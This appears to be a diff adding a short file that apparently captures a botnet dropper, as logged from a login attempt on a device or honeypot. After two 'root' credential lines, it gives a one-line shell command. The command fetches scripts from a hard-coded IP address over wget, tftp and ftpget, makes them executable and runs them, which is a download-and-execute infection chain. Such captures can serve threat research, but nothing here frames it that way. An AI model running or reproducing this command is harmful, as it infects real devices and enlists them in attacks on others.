@@ -1,0 +1,3 @@
+{root
+root
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.203.248.194/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 89.203.248.194 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 89.203.248.194; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 89.203.248.194 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
